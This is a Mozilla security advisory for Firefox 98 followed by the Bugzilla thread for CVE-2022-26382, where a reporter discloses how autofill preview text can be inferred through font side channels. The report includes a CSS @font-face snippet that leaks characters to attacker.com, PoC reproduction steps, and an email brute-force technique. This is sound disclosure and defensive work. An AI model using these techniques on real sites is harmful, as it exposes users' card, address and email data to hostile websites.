=== Content from www.mozilla.org_1c2f4f59_20250115_084644.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2022-10

## Security Vulnerabilities fixed in Firefox 98

Announced
March 8, 2022
Impact
high
Products
Firefox
Fixed in

* Firefox 98

#### [#CVE-2022-26383: Browser window spoof using fullscreen mode](#CVE-2022-26383)

Reporter
Irvan Kurniawan
Impact
high
##### Description

When resizing a popup after requesting fullscreen access, the popup would not display the fullscreen notification.

##### References

* [Bug 1742421](https://bugzilla.mozilla.org/show_bug.cgi?id=1742421)

#### [#CVE-2022-26384: iframe allow-scripts sandbox bypass](#CVE-2022-26384)

Reporter
Ed McManus
Impact
high
##### Description

If an attacker could control the contents of an iframe sandboxed with `allow-popups` but not `allow-scripts`, they were able to craft a link that, when clicked, would lead to JavaScript execution in violation of the sandbox.

##### References

* [Bug 1744352](https://bugzilla.mozilla.org/show_bug.cgi?id=1744352)

#### [#CVE-2022-26387: Time-of-check time-of-use bug when verifying add-on signatures](#CVE-2022-26387)

Reporter
Armin Ebert
Impact
high
##### Description

When installing an add-on, Firefox verified the signature before prompting the user; but while the user was confirming the prompt, the underlying add-on file could have been modified and Firefox would not have noticed.

##### References

* [Bug 1752979](https://bugzilla.mozilla.org/show_bug.cgi?id=1752979)

#### [#CVE-2022-26381: Use-after-free in text reflows](#CVE-2022-26381)

Reporter
Mozilla Fuzzing Team and Hossein Lotfi of Trend Micro Zero Day Initiative
Impact
high
##### Description

An attacker could have caused a use-after-free by forcing a text reflow in an SVG object leading to a potentially exploitable crash.

##### References

* [Bug 1736243](https://bugzilla.mozilla.org/show_bug.cgi?id=1736243)

#### [#CVE-2022-26382: Autofill Text could be exfiltrated via side-channel attacks](#CVE-2022-26382)

Reporter
Young Min Kim
Impact
moderate
##### Description

While the text displayed in Autofill tooltips cannot be directly read by JavaScript, the text was rendered using page fonts. Side-channel attacks on the text by using specially crafted fonts could have lead to this text being inferred by the webpage.

##### References

* [Bug 1741888](https://bugzilla.mozilla.org/show_bug.cgi?id=1741888)

#### [#CVE-2022-26385: Use-after-free in thread shutdown](#CVE-2022-26385)

Reporter
bo13oy of Cyber Kunlun Lab
Impact
moderate
##### Description

In unusual circumstances, an individual thread may outlive the thread's manager during shutdown. This could have led to a use-after-free causing a potentially exploitable crash.

##### References

* [Bug 1747526](https://bugzilla.mozilla.org/show_bug.cgi?id=1747526)

#### [#CVE-2022-0843: Memory safety bugs fixed in Firefox 98](#CVE-2022-0843)

Reporter
Mozilla developers
Impact
moderate
##### Description

Mozilla developers Kershaw Chang, Ryan VanderMeulen, and Randell Jesup reported memory safety bugs present in Firefox 97. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 98](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1746523%2C1749062%2C1749164%2C1749214%2C1749610%2C1750032%2C1752100%2C1752405%2C1753612%2C1754508)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_d4a4455c_20250115_084643.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1741888)
* [XML](/show_bug.cgi?ctype=xml&id=1741888)

Closed
[Bug 1741888](/show_bug.cgi?id=1741888)
(CVE-2022-26382)

Opened 3 years ago
Closed 3 years ago

# Autofill preview text can disclose sensitive information

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Autofill preview text can disclose sensitive information

## Categories

### (Toolkit :: Form Autofill, defect, P1)

[Product:](/describecomponents.cgi?product=Toolkit)

Toolkit
▾

Toolkit
The Mozilla Toolkit is a set of APIs, built on top of Gecko, which provide advanced services to XUL applications. These services include Profile Management, Chrome Registration, Browsing History, Extension and Theme Management, Application Update Service, and Safe Mode. ([More info](https://wiki.mozilla.org/Modules/Toolkit))
[See Open Bugs in This Product](/buglist.cgi?product=Toolkit&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Toolkit)
Watch This Product

[Component:](/describecomponents.cgi?product=Toolkit&component=Form%20Autofill#Form%20Autofill)

Form Autofill
▾

Toolkit :: Form Autofill
Form Autofill stores address/credit card information and fills them in multiple fields at once when the user runs into address/credit card forms on different websites.
[See Open Bugs in This Component](/buglist.cgi?product=Toolkit&component=Form%20Autofill&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Toolkit&component=Form%20Autofill&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Toolkit&component=Form%20Autofill)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S2

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

98 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Performance Impact | --- |
| --- | --- |
| Webcompat Priority | --- |
| Accessibility Severity | --- |
| Webcompat Score | --- |
| a11y-review | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr91 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr91&o1=equals&v1=wontfix) |
| firefox96 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox96&o1=equals&v1=wontfix) |
| firefox97 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox97&o1=equals&v1=wontfix) |
| firefox98 | --- | [verified](/buglist.cgi?f1=cf_status_firefox98&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr91 |  | wontfix |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox96 |  | wontfix |
| firefox97 |  | wontfix |
| firefox98 |  | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: y, Assigned: tgiles)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/c161a1db8cb12efdac86d88333c527ad?d=mm&size=40)  [tgiles](/user_profile?user_id=666930)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/00dd3423c26fb64e83ec942bdbdf7098?d=mm&size=40)  [y](/user_profile?user_id=694094)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

---

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

21 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

[1744009](/show_bug.cgi?id=1744009 "RESOLVED FIXED - Try to improve / simplify combobox layout.")

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

Dependency [tree](/showdependencytree.cgi?id=1741888&hide_resolved=1)
/ [graph](/showdependencygraph.cgi?id=1741888)

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[1745121](/show_bug.cgi?id=1745121 "NEW - Malicious third-party CSS can allow text content to be exfiltrated (with e.g. custom web-fonts)")

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=916838 "https://bugs.chromium.org/p/chromium/issues/detail?id=916838")

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=951487 "https://bugs.chromium.org/p/chromium/issues/detail?id=951487")

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=1013882 "https://bugs.chromium.org/p/chromium/issues/detail?id=1013882")

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=1035058 "https://bugs.chromium.org/p/chromium/issues/detail?id=1035058")

[bugs.chromium.org/p/chromium/issues/d...](https://bugs.chromium.org/p/chromium/issues/detail?id=1035063 "https://bugs.chromium.org/p/chromium/issues/detail?id=1035063")

## Details

### (Keywords: csectype-disclosure, reporter-external, sec-moderate, Whiteboard: [reporter-external] [client-bounty-form] [verif?][adv-main98+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2022-26382

[Keywords:](/describekeywords.cgi)

[csectype-disclosure](/buglist.cgi?keywords=csectype-disclosure&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-moderate](/buglist.cgi?keywords=sec-moderate&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form] [verif?][adv-main98+]

QA Whiteboard:

[post-critsmash-triage]

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a6496356_1689 "3 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (5 files, 2 obsolete files)

| [poc.html](/attachment.cgi?id=9251380)  [3 years ago](#c2)  [Young Min Kim](/user_profile?user_id=694094)   9.52 KB, text/html |  | [Details](/attachment.cgi?id=9251380&action=edit) |
| --- | --- | --- |
| [PoC video](/attachment.cgi?id=9251381)  [3 years ago](#c3)  [Young Min Kim](/user_profile?user_id=694094)   714.36 KB, video/mp4 |  | [Details](/attachment.cgi?id=9251381&action=edit) |
| [poc-width.html](/attachment.cgi?id=9252525)  [3 years ago](#c15)  [Young Min Kim](/user_profile?user_id=694094)   4.43 KB, text/html |  | [Details](/attachment.cgi?id=9252525&action=edit) |
| [Bug 1741888 - Fix autofill preview text not behaving as expected. r=sgalich!,emilio!](/attachment.cgi?id=9253073)  [3 years ago](#c20)  [Tim Giles [:tgiles]](/user_profile?user_id=666930)   48 bytes, text/x-phabricator-request |  | [Details](/attachment.cgi?id=9253073&action=edit) | [Review](/attachment.cgi?id=9253073) |
| [poc-width.html](/attachment.cgi?id=9253107)  [3 years ago](#c21)  [Young Min Kim](/user_profile?user_id=694094)   4.68 KB, text/html |  | [Details](/attachment.cgi?id=9253107&action=edit) |
| [poc-width.html](/attachment.cgi?id=9253303)  [3 years ago](#c25)  [Young Min Kim](/user_profile?user_id=694094)   4.57 KB, text/html |  | [Details](/attachment.cgi?id=9253303&action=edit) |
| [advisory.txt](/attachment.cgi?id=9266119)  [3 years ago](#c45)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   328 bytes, text/plain |  | [Details](/attachment.cgi?id=9266119&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Young Min Kim](/user_profile?user_id=694094)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1741888#c0)• 3 years ago |
|  | |

The previewed text of autofill, shown to the user when the user hovers over an autofill entry, contains sensitive information and should not be accessible by the website until the user selects it. However, several vulnerabilities exist that can be used to steal the preview text.

1. Font side-channel attack

   The font of the preview text follows the style of the field, making it possible to set the font of the preview text. The website can use a specially crafted font to infer the preview text, of which glyphs differ in size or font face.

(1) Size

Each character can have different width, and content can be inferred from size properties such as `scrollWidth.` Similar attacks have been proposed and patched in Chromium: crbug.com/916838 ([CVE-2019-5810](https://www.cve.org/CVERecord?id=CVE-2019-5810)), crbug.com/951487 ([CVE-2019-5848](https://www.cve.org/CVERecord?id=CVE-2019-5848)), crbug.com/1013882 ([CVE-2019-13737](https://www.cve.org/CVERecord?id=CVE-2019-13737)), crbug.com/1035058 ([CVE-2020-6393](https://www.cve.org/CVERecord?id=CVE-2020-6393)), and crbug.com/1035063.

(2) Ligatures

Font ligatures with abnormal size can be used to detect if a specific sequence exists (<https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/>).

(3) Font face

'unicode-range' of '@font-face' can be used to detect used characters in the font, e.g., assigning a single character for each font-faces:

@font-face {

font-family: AutofillCheck;

src: url(<https://attacker.com/font.woff2?a>) format('woff2');

unicode-range: U+61; /\* a \*/

}

W3C CSS Fonts Module Level 4 draft states:

> For *especially privacy-sensitive contexts*, options would include never downloading any webfonts (at the risk that some characters may be rendered incorrectly, or not at all), or always downloading all webfonts whether needed or not (ignoring unicode-range, and potentially downloading vast quantities of unused fonts each time the page is viewed).
>
> In addition, careful pairing of unicode-range and distinct src urls allows the third-party to see which characters are used on a page, which is a privacy risk for large character repertoire scripts such as CJK.

Whether a font face is loaded can be checked via the 'document.fonts.check()' API on the client-side or logging requests on the server-side.

(4) Chromium

Similar issues existed in Chromium, which other people and I've reported, and in response, they have pinned the preview font of <input> to `-webkit-small-control`: crrev.com/671647.

(5) Proposed fix

Pin the font family and size of the preview text to a system font, which stylesheets cannot override.

2. Inferring the content

   (1) The credit card expiration date, U.S. states, countries, and most CJK words have an almost unique combination of used alphabets, so they can be reliably inferred.

   (2) A uniquely identifiable character, possibly a homograph or invisible character, can be added to <option>s and used to identify suggested options.

   (3) There is no limit on the number of <option>s that an autofill entry matches, so it can be used in brute-force and de-anonymization attacks.

(4) Proposed fix

Limit the number of <option>s that autofill entries can match

3. Real-world risks and scenarios

   There are several bugs and tricks to enable autofill on hidden fields.

A legitimate form can use this to collect user information.

The autofill dialog can be activated by only two ArrowDown keypresses or a simple mouse action, which can be easily socially engineered into, e.g., phishing or disguised as a game.

The exploit takes only a few milliseconds and doesn't cause a noticeable delay. The popup will appear, but it'd be enough time to send information or make a purchase before the user notices, and it is dismissed if the focus is removed from the input, e.g., focusing on other elements or navigating away from the page.

4. Mitigating factors and future considerations

   Currently, the autofill value is not filled multiple times, which can be used to reduce the search space. If it were to be implemented in the future, a reasonable limit on the number of the value filled should be put in place (crbug.com/1075734, [CVE-2020-6521](https://www.cve.org/CVERecord?id=CVE-2020-6521)).
Flags: sec-bounty?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1741888#c1)• 3 years ago |
|  | |

Are you able to attach or link to a live testcase that demonstrates some of these issues? I'm not super familiar with our autofill code but I would have thought that the panels we use to allow user selection of form autofill entries already do not use the web font of the site in question. This would be easy to verify with a testcase. The other reason for this question is to clarify exactly what kind of autofill we're talking about (we've got a few different types).

Component: Security → Form AutofillFlags: needinfo?(y)Product: Firefox → Toolkit

|  | [Young Min Kim](/user_profile?user_id=694094)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1741888#c2)• 3 years ago |
|  | |

Attached file
[poc.html](attachment.cgi?id=9251380)
— [Details](attachment.cgi?id=9251380&action=edit)

5. Versions

   Reproducible on:

* 94.0.1 release
* 96.0a1 nightly

6. PoC

   (1) If Form Autofill is not enabled, enable it in about:config via `extensions.formautofill.available`: on, `extensions.formautofill.creditCards.available`: true, `extensions.formautofill.supportedCountries`: (add your country).

   (2) Add at least one credit card entry and one U.S address entry with a 3-letter Gmail email address in about:preferences#privacy

   (3) Serve the attached poc.html over a secure origin and navigate to the page (an online version is available in <https://me94bk1usdv8c8tfybvy.netlify.app/cznsgpbx7mkaswmrkjgd.html>)

   (4) Click on any input and hover the mouse over an autofill entry OR press the up or down arrow key on focused input to preview autofill.

   (5) The inferred content will appear below.
Flags: needinfo?(y)

|  | [Young Min Kim](/user_profile?user_id=694094)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1741888#c3)• 3 years ago |
|  | |

Attached video
[PoC video](attachment.cgi?id=9251381)
— [Details](attachment.cgi?id=9251381&action=edit)

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1741888#a4801_159069)• 3 years ago |

Type: task → defect

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1741888#c4)• 3 years ago |
|  | |

Young Min Kim, thanks for the detailed report and attaching both a video and PoC, makes it straightforward to reproduce the issue at hand.

:emilio, do you think there's any issue forcing autofill preview text to use a system font? See "(5) Proposed Fix" in [comment #0](/show_bug.cgi?id=1741888#c0 "VERIFIED FIXED - Autofill preview text can disclose sensitive information") for more information. I tried changing `input:-moz-autofill-preview` to use `font: system-ui !important` but the previewed address content is still able to be inferred via the poc.html file, so I guess there's some other places in forms.css that I'm unaware of.

Young Min Kim, I'm not sure I understand "There is no limit on the number of <option>s that an autofill entry matches, so it can be used in brute-force and de-anonymization attacks". Are you saying that, using your video as an example, if an address entry had "New Jersey" as the state and there were multiple select <options>s that contained the values of "N", "JN", "JE", "RS", etc, the attack would be able to used these inferred characters to very accurately determine that the previewed content is "New Jersey"? Just trying to make sure I accurate understand what is going on here.

Severity: -- → S2Status: UNCONFIRMED → NEWEver confirmed: trueFlags: needinfo?(y)Flags: needinfo?(emilio)Priority: -- → P1

|  | [Tim Giles [:tgiles]](/user_profile?user_id=666930)  Assignee |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1741888#c5)• 3 years ago |
|  | |

Ah okay, with `font-family: system-ui !important` on `input:-moz-autofill-preview`, that removing the inferring bit from the name and email field (and other free form text fields I would assume). There's still the issue of the "no limit on number of <options>s that an autofill entry matches" so I'll need to look deeper into that.

|  | [Young Min Kim](/user_profile?user_id=694094)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1741888#c6)• 3 years ago |
|  | |

(In reply to Tim Giles [:tgiles] from [comment #4](/show_bug.cgi?id=1741888#c4 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> Young Min Kim, I'm not sure I understand "There is no limit on the number of <option>s that an autofill entry matches, so it can be used in brute-force and de-anonymization attacks". Are you saying that, using your video as an example, if an address entry had "New Jersey" as the state and there were multiple select <options>s that contained the values of "N", "JN", "JE", "RS", etc, the attack would be able to used these inferred characters to very accurately determine that the previewed content is "New Jersey"? Just trying to make sure I accurate understand what is going on here.

Actually, it's the email part. There is no limit on the length of `selectEl.options` in `FormAutofillUtils.findAddressSelectOption` (<https://searchfox.org/mozilla-central/rev/0f3e259c24e52932387318ac503bfad3c82baa44/toolkit/components/formautofill/FormAutofillUtils.jsm#814-822>). I've tested Autofill successfully matches against 1000K <option>s. This makes possible a brute-force attack if partial value or specific pattern of the field is known, or a de-anonymization attack to test if the field value is included in the given list. The email field in the PoC demonstrates that if it is known that the user's email address consists of three alphabet letters and uses Gmail, it can be reliably inferred.

Chromium has a limit of 512 ([https://source.chromium.org/chromium/chromium/src/+/main:components/autofill/core/common/autofill\_data\_validation.cc;l=17-19;drc=d805a11b69ccfc6376a1a5e05bfe603a4481c3a5](https://source.chromium.org/chromium/chromium/src/%2B/main%3Acomponents/autofill/core/common/autofill_data_validation.cc;l=17-19;drc=d805a11b69ccfc6376a1a5e05bfe603a4481c3a5)) for technical reasons, to prevent sending too much data in IPC. However, it helped prevent these kinds of attacks, too.

Flags: needinfo?(y)

|  | [Emilio Cobos Álvarez (:emilio)](/user_profile?user_id=546716) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1741888#c7)• 3 years ago |
|  | |

Rather than `system-ui` we should probably be using `revert` so that it goes back to the `field` system font. But yeah that seems like a reasonable fix. A bit unfortunate because the previewed bit will look different once it's actually inserted in the page though. Do you know if/other browsers suffer from the same kind of issue?

Flags: needinfo?(emilio)

|  | [Young Min Kim](/user_profile?user_id=694094)  Reporter |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1741888#c8)• 3 years ago |
|  | |

(In reply to Emilio Cobos Álvarez (:emilio) from [comment #7](/show_bug.cgi?id=1741888#c7 "VERIFIED FIXED - Autofill preview text can disclose sensitive information"))

> Do you know if/other browsers suffer from the same kind of issue?

